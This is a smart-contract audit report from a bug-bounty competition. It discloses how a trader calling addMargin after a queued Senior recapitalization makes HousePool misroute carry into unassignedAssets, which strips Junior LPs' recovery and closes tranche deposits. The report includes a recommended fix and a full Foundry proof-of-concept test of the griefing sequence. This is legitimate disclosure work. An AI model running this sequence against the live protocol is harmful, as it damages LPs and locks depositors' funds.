# \#98300 [SC-High] post-recapitalization revenue is misrouted into `unassignedAssets`

**Submitted on Nov 6th 2026 at 20:12:48 UTC by @Petrus for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98300
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
An external trader can realize accrued carry after a Senior recapitalization has been queued but before reconciliation; because the carry is not recorded as pending revenue, reconciliation uses it to restore Senior first and then routes the overlapping recapitalization into `unassignedAssets` instead of Junior, blocking tranche deposits without giving the attacker any profit.

## Vulnerability Details
HousePool recognizes the trader’s carry as ordinary surplus before it applies the earlier pending recap, so the carry fills Senior’s gap and the now-excess recap is quarantined instead of subsequent value continuing to Junior.

The root cause is that revenue is queued only when both stored tranche principals are zero:
```
function recordClaimantInflow(
    uint256 amount,
    IHousePool.ClaimantInflowKind kind,
    IHousePool.ClaimantInflowCashMode cashMode
) external {
    if (msg.sender != address(ENGINE) && msg.sender != ENGINE.settlementSidecar()) {
        revert HousePool__Unauthorized();
    }
    if (amount == 0) {
        return;
    }

    if (kind == IHousePool.ClaimantInflowKind.Recapitalization && msg.sender != address(ENGINE)) {
        revert HousePool__Unauthorized();
    }

    if (cashMode == IHousePool.ClaimantInflowCashMode.CashArrived) {
        accountedAssets += amount;
    }

    if (kind == IHousePool.ClaimantInflowKind.Recapitalization) {
        _recordPendingClaimantInflow(kind, amount);
    } else if (seniorPrincipal + juniorPrincipal == 0) {
        _recordPendingClaimantInflow(kind, amount);
    }

    emit ClaimantInflowAccounted(msg.sender, kind, cashMode, amount);
}
```

Therefore, revenue arriving while Senior still has nonzero stored principal increases `accountedAssets` but is absent from `pendingTradingRevenueAssets`.

During reconciliation, only recorded pending buckets are excluded from ordinary distributable value:
```
function _reconcile(
    HousePoolEngineViewTypes.HousePoolInputSnapshot memory accountingSnapshot,
    HousePoolEngineViewTypes.HousePoolStatusSnapshot memory statusSnapshot
) internal {
    uint256 couponElapsed =
        block.timestamp > lastSeniorCouponCheckpointTime ? block.timestamp - lastSeniorCouponCheckpointTime : 0;
    bool markFresh = _markIsFreshForReconcile(accountingSnapshot, statusSnapshot);
    HousePoolAccountingLib.ReconcileSnapshot memory reconcileSnapshot =
        HousePoolAccountingLib.buildReconcileSnapshot(accountingSnapshot);
    HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets = _getPendingClaimantBuckets();
    HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets =
        _settleablePendingClaimantBuckets(reconcileSnapshot, claimantBuckets);
    bool allowRevenueContinuation = seniorPrincipal + juniorPrincipal != 0;
    HousePoolReconcilePlanLib.ReconcilePlan memory plan = HousePoolReconcilePlanLib.planReconcile(
        _currentPendingAccountingState(),
        reconcileSnapshot,
        _pendingClaimantBucketAssets(settleableClaimantBuckets),
        poolConfig.seniorRateBps,
        couponElapsed,
        markFresh
    );

    allowRevenueContinuation = allowRevenueContinuation
        || plan.state.waterfall.seniorPrincipal + plan.state.waterfall.juniorPrincipal != 0;

    if (couponElapsed > 0) {
        lastSeniorCouponCheckpointTime = block.timestamp;
    }

    _setWaterfallState(plan.state.waterfall);
    unassignedAssets = plan.state.unassignedAssets;

    if (markFresh) {
        terminalDeficitAssets = reconcileSnapshot.deficit;
        lastReconcileTime = block.timestamp;

        uint256 juniorRevenueWithoutOwners = HousePoolReconcilePlanLib.juniorRevenueWithoutOwners(plan);
        if (juniorRevenueWithoutOwners > 0) {
            juniorPrincipal -= juniorRevenueWithoutOwners;
            unassignedAssets += juniorRevenueWithoutOwners;
        }
    }

    _applyPendingClaimantBucketsLive(settleableClaimantBuckets, claimantBuckets, allowRevenueContinuation);
}
```

Consequently, the unqueued carry restores Senior before the queued recapitalization is applied; because Senior is already restored, the overlapping recapitalization becomes unassigned:
```
function applyClaimantRecapitalizationIntent(
    PendingAccountingState memory state,
    uint256 amount,
    uint256 recapitalizationTargetAssets
) internal pure {
    uint256 remaining = amount;
    if (state.seniorSupply > 0) {
        if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
            state.waterfall.seniorPrincipal += remaining;
            state.waterfall.seniorHighWaterMark =
                recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
            remaining = 0;
        } else {
            uint256 gap = state.waterfall.seniorHighWaterMark > state.waterfall.seniorPrincipal
                ? state.waterfall.seniorHighWaterMark - state.waterfall.seniorPrincipal
                : 0;
            if (gap > 0) {
                uint256 seniorAssignedAssets = remaining > gap ? gap : remaining;
                state.waterfall.seniorPrincipal += seniorAssignedAssets;
                remaining -= seniorAssignedAssets;
            }
        }
    }
    if (remaining > 0) {
        state.unassignedAssets += remaining;
    }
}
```

### Vulnerability context

Recapitalization is intended to restore Senior before subsequent revenue flows through the waterfall to Junior, but unqueued revenue is processed as ordinary distributable value before the pending recapitalization, making allocation depend on whether revenue arrives before or after the first reconcile.



This vulnerability is reachable in production  because Any external trader with an open position and collectible accrued carry can call the public `addMargin` function after a recapitalization is queued and before the next reconciliation:
```
function addMargin(
    address account,
    uint256 amount
) external nonReentrant {
    if (msg.sender != account) {
        revert CfdEngine__NotAccountOwner();
    }
    if (amount == 0) {
        revert CfdEngine__ZeroAmount();
    }

    StoredPosition storage pos = _positions[account];
    if (pos.lots == 0) {
        revert CfdEngine__NoOpenPosition();
    }

    bytes32 expectedOldHash = _beginTerminalCurveMutation(account);
    _realizeCarryFromSettlement(account, pos);

    uint256 marginBefore = _positionMarginBucketAssets(account);
    clearinghouse.lockPositionMargin(account, amount);
    _sideState(pos.side).totalMargin += amount;
    _syncPositionBorrowBaseToMargin(pos, marginBefore + amount);
    pos.lastUpdateTime = uint64(block.timestamp);
    pos.lastCarryTimestamp = uint64(block.timestamp);
    _endTerminalCurveMutation(account, expectedOldHash);

    emit MarginAdded(account, amount);
}
```




So, Junior LPs lose the timing-dependent recovery that should follow the completed Senior recapitalization, while depositors remain unable to activate or submit tranche deposits.

### ## Impact Details


Up to the overlapping post-recapitalization distributable increase is shifted from Junior into `unassignedAssets`, which causes the common tranche-deposit gate to remain closed .


### Recommended solution

 Queue trading revenue whenever either both tranche principals are zero or a recapitalization is pending, and expose that rule through one shared `queuesTradingRevenue()` view used by `HousePool` and all three engine snapshot builders.

```solidity
// IHousePool.sol

function queuesTradingRevenue() external view returns (bool);
```

```solidity
// HousePool.sol

function queuesTradingRevenue() public view override returns (bool) {
    return pendingRecapitalizationAssets != 0 || seniorPrincipal + juniorPrincipal == 0;
}

function recordClaimantInflow(
    uint256 amount,
    IHousePool.ClaimantInflowKind kind,
    IHousePool.ClaimantInflowCashMode cashMode
) external {
    if (msg.sender != address(ENGINE) && msg.sender != ENGINE.settlementSidecar()) {
        revert HousePool__Unauthorized();
    }
    if (amount == 0) {
        return;
    }

    if (kind == IHousePool.ClaimantInflowKind.Recapitalization && msg.sender != address(ENGINE)) {
        revert HousePool__Unauthorized();
    }

    if (cashMode == IHousePool.ClaimantInflowCashMode.CashArrived) {
        accountedAssets += amount;
    }

    if (kind == IHousePool.ClaimantInflowKind.Recapitalization || queuesTradingRevenue()) {
        _recordPendingClaimantInflow(kind, amount);
    }

    emit ClaimantInflowAccounted(msg.sender, kind, cashMode, amount);
}
```

Use the shared view in `CfdEngineLens`, `CfdEngineSettlementSidecar`, and `CfdOrderPolicyEvaluatorBase`:

```solidity
snap.poolQueuesTradingRevenue = pool.queuesTradingRevenue();
```

For the snapshot variable named `snapshot`:

```solidity
snapshot.poolQueuesTradingRevenue = pool.queuesTradingRevenue();
```

This ensures the live pool and every planner reserve and route the same revenue consistently, applying the pending recapitalization before later revenue.

## Proof of Concept

## Proof of Concept
First put the test in this path:
packages/perps/test/

Run with:  forge test --match-test test_PendingRecapCarryRealizationGriefsJuniorAndBlocksDeposits -vvvv


```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolTestBase} from "./perps/shared/HousePoolTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

contract PendingRecapCarryGriefingPoC is HousePoolTestBase {

    function test_PendingRecapCarryRealizationGriefsJuniorAndBlocksDeposits() public {
        address seniorLp = address(0x5101);
        address juniorLp = address(0x5102);
        address pendingSeniorDepositor = address(0x5103);
        address drainingLongTrader = address(0xA771);
        address carryGriefer = address(0xA772);
        address remainingShortTrader = address(0xA773);

        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.seniorRateBps = 0;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        _refreshMarkForAsyncSettlement();
        pool.finalizePoolConfig();
        assertEq(pool.seniorRateBps(), 0, "coupon is disabled so only attacker-realized carry can create the overlap");

        _fundJunior(juniorLp, 99_000e6);
        _fundSenior(seniorLp, 99_000e6);
        assertEq(pool.seniorPrincipal(), pool.seniorHighWaterMark(), "Senior starts fully backed");
        assertGt(pool.seniorPrincipal(), 100_000e6, "the fixture has a real funded Senior tranche");
        assertGt(pool.juniorPrincipal(), 99_000e6, "Junior starts funded and has real non-seed owners");
        assertGt(juniorVault.balanceOf(juniorLp), 0, "the harmed Junior LP owns real shares");

        uint256 pendingDepositAssets = 1000e6;
        settlementToken.mint(pendingSeniorDepositor, pendingDepositAssets);
        vm.startPrank(pendingSeniorDepositor);
        settlementToken.approve(address(seniorVault), pendingDepositAssets);
        uint256 pendingSeniorDepositId =
            seniorVault.requestDeposit(pendingDepositAssets, pendingSeniorDepositor, pendingSeniorDepositor);
        vm.stopPrank();
        assertEq(
            seniorVault.pendingDepositRequest(pendingSeniorDepositId, pendingSeniorDepositor),
            pendingDepositAssets,
            "a real Senior deposit is escrowed before the incident"
        );

        uint256 juniorRedeemShares = juniorVault.balanceOf(juniorLp);
        vm.prank(juniorLp);
        uint256 juniorRedeemId = juniorVault.requestRedeem(juniorRedeemShares, juniorLp, juniorLp);
        assertEq(
            juniorVault.pendingRedeemRequest(juniorRedeemId, juniorLp),
            juniorRedeemShares,
            "a real Junior redemption is queued before the loss"
        );

        _fundTrader(drainingLongTrader, 30_000e6);
        _fundTrader(carryGriefer, 10_000e6);
        _fundTrader(remainingShortTrader, 10_000e6);

        vm.prank(remainingShortTrader);
        uint64 orderId = router.commitOrder(CfdTypes.Side.SHORT, 80_000e18, 5000e6, 0, false);
        router.executeOrder(orderId, _mockPythUpdateData(1e8));

        vm.prank(carryGriefer);
        orderId = router.commitOrder(CfdTypes.Side.LONG, 10_000e18, 2000e6, 0, false);
        router.executeOrder(orderId, _mockPythUpdateData(1e8));

        vm.prank(drainingLongTrader);
        orderId = router.commitOrder(CfdTypes.Side.LONG, 180_000e18, 20_000e6, 0, false);
        router.executeOrder(orderId, _mockPythUpdateData(1e8));
        (uint256 grieferPositionSize,,,,,,) = engine.positions(carryGriefer);
        assertEq(grieferPositionSize, 10_000e18, "griefer has a genuine pre-existing position");

        vm.warp(block.timestamp + 365 days);
        vm.prank(drainingLongTrader);
        orderId = router.commitOrder(CfdTypes.Side.LONG, 180_000e18, 0, 0, true);
        router.executeOrder(orderId, _mockPythUpdateData(1e6));
        assertTrue(engine.degradedMode(), "the real close flow must latch degraded mode");

        (uint256 projectedSeniorBeforeRecap, uint256 projectedJuniorBeforeRecap) =
            pool.getPendingDepositTrancheState();
        uint256 seniorHighWaterMark = pool.seniorHighWaterMark();
        assertEq(projectedJuniorBeforeRecap, 0, "the close must wipe Junior in the canonical preview");
        assertGt(projectedSeniorBeforeRecap, 0, "Senior must retain a live claimant path");
        assertLt(projectedSeniorBeforeRecap, seniorHighWaterMark, "Senior must be impaired before recapitalization");

        assertEq(
            juniorVault.pendingRedeemRequest(juniorRedeemId, juniorLp),
            juniorRedeemShares,
            "the now-matured zero-NAV redemption will provide settlement progress"
        );

        assertGe(pool.currentLpEpoch(), juniorRedeemId, "the Junior redemption must be mature");
        bytes[] memory reconcileUpdateData = _mockPythUpdateData(1e6);

        (projectedSeniorBeforeRecap, projectedJuniorBeforeRecap) = pool.getPendingDepositTrancheState();
        uint256 recapitalization = seniorHighWaterMark - projectedSeniorBeforeRecap;
        assertGt(recapitalization, 0, "owner must have a nonzero Senior gap to restore");
        settlementToken.mint(address(this), recapitalization);
        settlementToken.approve(address(engine), recapitalization);
        engine.recapitalizePool(recapitalization);
        assertEq(
            pool.pendingRecapitalizationAssets(),
            recapitalization,
            "the owner recap is queued through the production entrypoint"
        );

        (uint256 projectedSeniorAfterRecap, uint256 projectedJuniorAfterRecap) =
            pool.getPendingDepositTrancheState();
        assertEq(projectedSeniorAfterRecap, seniorHighWaterMark, "before the attack the pending recap makes Senior whole");
        assertEq(projectedJuniorAfterRecap, 0, "Junior is still waiting for the next distributable increase");
        assertEq(pool.unassignedAssets(), 0, "no value is unassigned before the attack");
        assertEq(pool.pendingTradingRevenueAssets(), 0, "no trading revenue is pending before the attack");

        uint256 poolAssetsBeforeAttack = pool.totalAssets();
        (, uint256 attackerMarginBefore,,,,,) = engine.positions(carryGriefer);
        vm.prank(carryGriefer);
        engine.addMargin(carryGriefer, 1e6);
        uint256 realizedCarry = pool.totalAssets() - poolAssetsBeforeAttack;
        (, uint256 attackerMarginAfter,,,,,) = engine.positions(carryGriefer);
        assertGt(realizedCarry, 0, "the external trader must realize a genuine distributable carry increase");
        assertEq(
            attackerMarginBefore + 1e6 - attackerMarginAfter,
            realizedCarry,
            "the griefer pays the carry and receives no extraction profit"
        );
        assertEq(
            pool.pendingTradingRevenueAssets(),
            0,
            "BUG: carry is not queued while stored tranche principal remains nonzero"
        );
        assertEq(pool.unassignedAssets(), 0, "the damage remains latent until reconciliation");

        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "owner recap restores raw solvency for normal settlement");

        router.settleLpEpoch(reconcileUpdateData);
        assertEq(
            juniorVault.refundableRedeemRequest(juniorRedeemId, juniorLp),
            juniorRedeemShares,
            "the zero-NAV redemption makes the production settlement persist its reconciliation"
        );
        assertEq(pool.pendingRecapitalizationAssets(), 0, "the first successful reconciliation consumes the recap");
        assertEq(pool.seniorPrincipal(), seniorHighWaterMark, "Senior ends fully restored");
        assertEq(pool.juniorPrincipal(), 0, "BUG: Junior receives none of the attacker-triggered distributable increase");
        assertEq(
            pool.unassignedAssets(),
            realizedCarry,
            "BUG: the entire overlap is shifted into unassignedAssets instead of Junior recovery"
        );

        IHousePool.PoolLiquidityView memory liquidity = pool.getPoolLiquidityView();
        assertTrue(liquidity.markFresh, "the post-attack entry failure is not caused by a stale mark");
        assertFalse(liquidity.degradedMode, "the post-attack entry failure is not caused by degraded mode");
        assertEq(liquidity.currentTerminalDeficitAssets, 0, "the post-attack entry failure is not caused by a deficit");
        assertEq(pool.seniorPrincipal(), pool.seniorHighWaterMark(), "the entry failure is not Senior impairment");
        assertTrue(pool.canAcceptOrdinaryDeposits(), "the ordinary deposit lifecycle remains active");
        assertFalse(pool.canSettleDepositEntries(), "BUG: unassignedAssets closes the common deposit-activation gate");
        assertEq(
            seniorVault.pendingDepositRequest(pendingSeniorDepositId, pendingSeniorDepositor),
            pendingDepositAssets,
            "the victim's matured Senior deposit remains blocked in escrow"
        );
        assertEq(
            seniorVault.claimableDepositRequest(pendingSeniorDepositId, pendingSeniorDepositor),
            0,
            "the blocked victim receives no claimable Senior shares"
        );

        settlementToken.mint(address(0x5104), 1e6);
        vm.startPrank(address(0x5104));
        settlementToken.approve(address(seniorVault), 1e6);
        vm.expectRevert(TrancheVault.TrancheVault__DepositsUnavailable.selector);
        seniorVault.requestDeposit(1e6, address(0x5104), address(0x5104));
        vm.stopPrank();
    }

}
```
